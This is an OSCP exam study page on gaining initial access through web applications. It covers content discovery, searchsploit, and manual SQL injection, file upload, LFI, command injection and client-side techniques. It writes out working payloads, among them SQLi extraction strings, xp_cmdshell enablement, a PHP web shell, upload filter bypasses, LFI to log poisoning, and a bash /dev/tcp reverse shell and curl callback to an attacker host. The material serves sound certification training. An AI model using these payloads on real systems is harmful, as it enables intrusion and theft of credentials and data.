---
title: Web & Initial Access
tags:
  - oscp
---

# Web & Initial Access { #web-initial-access }

<div class="dfir-meta" markdown>
**Exam weight:** 10 points per standalone (`local.txt`) · **Last updated:** 2026-11-03
</div>

!!! abstract "In one sentence"
    Getting the first shell on a standalone: usually a web application or an exposed service, often a public exploit that needs fixing before it runs — found by thorough content discovery and manual testing, not by automated scanners.

## 1. Concept { #concept }

Initial access on OSCP machines almost always falls into one of these buckets, roughly in order of how often they appear:

| Bucket | Typical signal | Where it leads |
|---|---|---|
| **Known-vulnerable software** | A CMS / app / service with a version number | Public exploit (`searchsploit`), usually needs editing |
| **Default / weak / reused credentials** | Admin panel, Tomcat, Jenkins, Grafana, database, SSH | Authenticated feature that runs code (plugin, template, WAR deploy) |
| **Hidden content** | Nothing obvious on `/` | `/backup`, `/dev`, `.git/`, a second vhost, an API |
| **App logic flaw** | Parameters that change output | SQLi, LFI / path traversal, upload bypass, command injection, SSRF |
| **Client-side** | A "user" who opens files / visits links | Malicious document / shortcut, captured NetNTLMv2 |

The rule of thumb: **enumerate until you can explain every port**, then try the cheapest idea first.

## 2. Main tools { #tools }

| Tool | Use it for | Exam status |
|---|---|---|
| **ffuf** | Fast fuzzing of paths, parameters, vhosts | Allowed |
| **feroxbuster** | Recursive directory discovery | Allowed |
| **gobuster** | Directory and vhost brute force (simple, stable) | Allowed |
| **nikto** | Quick web-server misconfiguration check | Allowed (named in the guide) |
| **Burp Suite Community** | Proxy, Repeater, Decoder, Comparer | Allowed |
| **searchsploit** | Offline Exploit-DB search and copy | Allowed |
| **whatweb / curl / browser dev tools** | Fingerprinting, headers, source | Allowed |
| **hydra** | Login brute force with a known user | Allowed — use sparingly → [Password attacks](password-attacks.md#hydra) |

!!! danger "Exam rule — banned web tools"
    - **sqlmap / SQLninja** and any other *automatic exploitation* tool — banned. Do SQLi by hand → [Manual SQLi](#sqli).
    - **Burp Suite Pro** (and other commercial tools) — banned. Burp **Community** is fine; its Scanner isn't there anyway.
    - **Mass vulnerability scanners** (Nessus, OpenVAS, Acunetix-style crawl-and-scan) — banned.
    - Features inside an allowed tool that do a banned job (e.g. an auto-exploit plugin) — also banned.

## 3. Scenarios { #scenarios }

### 3.1 First look at a web port { #first-look }

**Situation:** `80/tcp open http Apache httpd 2.4.x` (or any web port).

```bash
whatweb -a 3 http://$IP
curl -si http://$IP/ | head -30            # headers: Server, X-Powered-By, cookies, redirects
curl -s http://$IP/robots.txt
nikto -h http://$IP -o loot/nikto.txt
```

Then open it in the browser **through Burp Community** so every request is in HTTP history. Read the page source (`Ctrl-U`) for comments, JS file paths, API endpoints, version strings.

**What to read:** a redirect to a hostname (→ `/etc/hosts`), a CMS generator tag, `X-Powered-By: PHP/7.x`, `nikto` hits like `/phpmyadmin/`, `/server-status`, backup files, `PUT` allowed.

**Next:** CMS name + version → [searchsploit](#searchsploit). Otherwise → content discovery.

### 3.2 Content discovery — ffuf / feroxbuster / gobuster { #content-discovery }

**Situation:** The landing page gives nothing away.

=== "feroxbuster (recursive)"

    ```bash
    feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
      -x php,txt,html,bak,zip -t 50 -o loot/ferox.txt
    ```

=== "ffuf (flexible)"

    ```bash
    ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
      -e .php,.txt,.bak -fc 404 -o loot/ffuf.json
    ```

=== "gobuster (simple)"

    ```bash
    gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt \
      -x php,txt,bak -o loot/gobuster.txt
    ```

**What to read:** `200` and `301` on unexpected names (`/admin`, `/dev`, `/backup`, `/uploads`, `/api`), `403` on directories (fuzz *inside* them), files like `config.php.bak`, `.git/HEAD`, `.env`.

**Next:**

- `/.git/` exposed → dump it (`git-dumper http://$IP/.git loot/git`) and read history for credentials.
- `/uploads/` exists → look for the upload form that writes there.
- Login page → defaults, then the app's documentation for default creds.

!!! tip "Filter by size, not just status"
    Many apps return `200` for everything. Run once, note the size of the junk response, then add `-fs <size>` (ffuf) or `--filter-size <size>` (feroxbuster).

### 3.3 Virtual hosts / subdomains { #vhosts }

**Situation:** nmap or a redirect revealed a domain such as `site.local`.

```bash
ffuf -u http://$IP -H "Host: FUZZ.site.local" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
# or
gobuster vhost -u http://site.local --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

**Next:** add each hit (`dev.site.local`) to `/etc/hosts` and repeat 3.1–3.2 on it — dev vhosts often run an older, vulnerable build.

### 3.4 Known software → searchsploit { #searchsploit }

**Situation:** You identified `Product X 2.3.1`.

```bash
searchsploit product x 2.3
searchsploit -x 49876          # read it
searchsploit -m 49876          # copy to the current directory
```

Also search the web: `"Product X 2.3.1" exploit`, `CVE-XXXX-YYYY poc github`.

**Before running any public exploit:**

1. **Read it.** What does it send, what does it expect back, does it need authentication?
2. **Fix it.** Target URL / port / path, `LHOST` / `LPORT`, Python 2 → 3 (`print`, `bytes` vs `str`), SSL verification, hard-coded paths.
3. **Replace any embedded shellcode** with your own `msfvenom` output → [Shells & file transfer](shells-file-transfer.md#msfvenom).
4. **Note every change** for the report ([exam rule](exam-format.md#exploit-code)).

**What to read when it fails:** run it with a proxy (`proxies={'http':'http://127.0.0.1:8080'}` in Python) and watch the request in Burp — usually the path or a CSRF token is wrong.

### 3.5 Burp Suite Community — manual testing workflow { #burp }

**Situation:** You found a form or parameter and want to test it by hand.

1. Proxy → HTTP history → right-click the request → **Send to Repeater** (`Ctrl-R`).
2. Change one thing at a time; compare responses (length, error, timing) — use **Comparer** for subtle diffs.
3. Use **Decoder** for base64 / URL encoding of payloads.
4. Intruder in Community is throttled — for wordlist fuzzing of a parameter use `ffuf` with the request saved from Burp:

```bash
# save the request from Burp to req.txt, put FUZZ where the payload goes
ffuf -request req.txt -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mr 'error|syntax'
```

### 3.6 SQL injection — manual only { #sqli }

**Situation:** A parameter (`?id=1`, a login form, a search box) behaves differently with a quote.

**Detect:**

```text
id=1'                      → SQL error?          (error-based possible)
id=1 AND 1=1-- -  vs  id=1 AND 1=2-- -   → different page?   (boolean)
id=1' AND SLEEP(5)-- -     → 5 s delay?          (time-based, MySQL)
id=1'; WAITFOR DELAY '0:0:5'-- -                 (time-based, MSSQL)
```

**Login bypass:** `admin' -- -` or `' OR 1=1-- -` in the username.

**UNION extraction (MySQL example):**

```text
id=1 ORDER BY 1-- -        … increase until error → N columns
id=-1 UNION SELECT 1,2,3-- -                       → which column is reflected?
id=-1 UNION SELECT 1,@@version,database()-- -
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
id=-1 UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -
```

**From SQLi to a shell:**

| DBMS | Technique | Requires |
|---|---|---|
| MySQL | `UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/c.php'` | FILE privilege, writable web root, `secure_file_priv` empty |
| MSSQL | `'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -` then `'; EXEC xp_cmdshell 'powershell -c ...'-- -` | sysadmin, stacked queries |
| MSSQL | `'; EXEC master..xp_dirtree '\\<KALI>\share'-- -` | Any login → captures the service account's NetNTLMv2 on your `impacket-smbserver` |
| PostgreSQL | `'; COPY (SELECT '') TO PROGRAM 'id > /tmp/o'-- -` | superuser |

**Next:** dumped hashes → [Password attacks](password-attacks.md); credentials → try them on SSH / admin panel / SMB.

!!! danger "Exam rule"
    sqlmap is banned — *including* "just for detection". Keep your own payload notes per DBMS; the table above is a starting point.

### 3.7 File upload → reverse shell { #file-upload }

**Situation:** An upload form (profile picture, document import, plugin upload).

1. Upload a harmless file and find **where it lands** (response, page source, `/uploads/`, feroxbuster).
2. Try a minimal web shell: `<?php system($_GET['c']); ?>` as `shell.php`.
3. If blocked, bypass the filter one variable at a time:
    - extension: `.phtml`, `.php5`, `.phar`, `.pHp`, `shell.php.jpg`, `shell.jpg.php`
    - `Content-Type: image/png` in Burp
    - magic bytes: start the file with `GIF89a;`
    - upload an `.htaccess` with `AddType application/x-httpd-php .evil`, then `shell.evil`
    - IIS: `.aspx`, `.asp`, `.config`; Tomcat: a WAR via the manager
4. Confirm execution: `curl "http://$IP/uploads/shell.php?c=id"`.
5. **Upgrade to a reverse shell** (the web shell is not enough for the flag screenshot):

```bash
curl "http://$IP/uploads/shell.php" --data-urlencode "c=bash -c 'bash -i >& /dev/tcp/$KALI/443 0>&1'"
```

### 3.8 LFI / path traversal { #lfi }

**Situation:** `?page=about.php`, `?file=report.pdf`, `?lang=en`.

```text
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd                     (filter strips ../ once)
?page=php://filter/convert.base64-encode/resource=index.php   (read PHP source)
?page=C:\Windows\System32\drivers\etc\hosts            (Windows)
```

Fuzz it: `ffuf -u "http://$IP/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <size>`

**What to read:** `/etc/passwd` (users with shells), app config files (DB creds), `/home/<user>/.ssh/id_rsa`, `C:\inetpub\wwwroot\web.config`.

**LFI → RCE options:** include an uploaded file; **log poisoning** (send `<?php system($_GET['c']); ?>` as the User-Agent, then include `/var/log/apache2/access.log&c=id`); `data://` / `php://input` wrappers if `allow_url_include` is on; RFI (`?page=http://$KALI/shell.php`) if remote includes work. On Windows, an LFI to a UNC path (`\\$KALI\share\x`) can leak a NetNTLMv2 hash to your SMB server.

### 3.9 Command injection { #command-injection }

**Situation:** A "ping", "nslookup", "convert" or "backup" feature that takes your input.

```text
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 && id
$(id)    `id`
127.0.0.1%0aid             (newline)
```

Blind? Use timing (`; sleep 5`) or an out-of-band callback (`; curl http://$KALI/x`, watch `python3 -m http.server`).

### 3.10 Login pages, default credentials and brute force { #logins }

1. Product defaults (`admin:admin`, `tomcat:s3cret`, `admin:password`), the product's docs, `/usr/share/seclists/Passwords/Default-Credentials/`.
2. Username = password; names found on the site as usernames.
3. Only then a targeted brute force with **hydra** → [Password attacks › hydra](password-attacks.md#hydra).

Logged in? Look for the feature that runs code: WordPress theme / plugin editor, Tomcat manager WAR deploy, Jenkins script console, CMS template editor, "import" functions.

### 3.11 Client-side attacks { #client-side }

If a box simulates a user who opens files (a mail server, a "send us your CV" upload, a writable share that someone browses):

- Plant a file that makes Windows reach out to **your** SMB server (a `.url` / `.lnk` / `.library-ms` with an icon or target path `\\$KALI\share`) and capture NetNTLMv2 with `impacket-smbserver`.
- Or deliver a payload (a shortcut that runs a PowerShell download cradle, a macro document) when the scenario clearly expects it.

!!! danger "Exam rule — no spoofing"
    Capturing hashes by **poisoning** LLMNR / NBT-NS / mDNS with Responder, or DHCPv6 with mitm6, is spoofing and banned. Making the target *connect to you* is fine → [AD › Coercion](active-directory.md#coercion).

Defender view of these payloads: [Red Team: Initial Access](../../redteam/initial-access.md) · [Phishing delivery](../../adversary/phishing-delivery.md) · [LNK & jump lists](../../windows/lnk-jumplists.md).

## 4. Common mistakes { #mistakes }

- **One wordlist, one extension.** A `.php` app hides `config.php.bak`; an IIS app hides `.aspx`. Match extensions to the stack.
- **Not fuzzing inside `403` directories** or new vhosts.
- **Running a public exploit unread** — then not knowing whether it failed or the box is not vulnerable.
- **Keeping the web shell.** You need an interactive reverse shell for the flag screenshot ([flag rules](exam-format.md#flag-rules)).
- **Assuming a filter is a dead end.** Upload / LFI filters on OSCP are usually naive; try the variations systematically.
- **Brute forcing blind.** Hydra with `rockyou.txt` and no confirmed username wastes an hour.

## 5. Exam tips { #exam-tips }

- Proxy *everything* through Burp from the start — the request that worked is your report evidence.
- When an exploit needs a reverse shell, use port **443 or 80** for `LPORT`; egress filtering is common.
- Write the vulnerable URL, parameter and payload in your notes the moment it works.
- Stuck for 45 minutes? Go back to [Recon](recon-enumeration.md) — there is usually a port or path you skimmed.

## Related pages

- [Exam workflow](exam-workflow.md) · [Recon & enumeration](recon-enumeration.md) · [Shells & file transfer](shells-file-transfer.md) · [Password attacks](password-attacks.md)
- [HTTP status codes](../../basics/http-status-codes.md) · [Well-known ports](../../basics/well-known-ports.md)
- [Red Team: Initial Access](../../redteam/initial-access.md) · [Phishing delivery](../../adversary/phishing-delivery.md) · [PowerShell cradles](../../adversary/powershell-cradles.md)

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [SecLists](https://github.com/danielmiessler/SecLists)
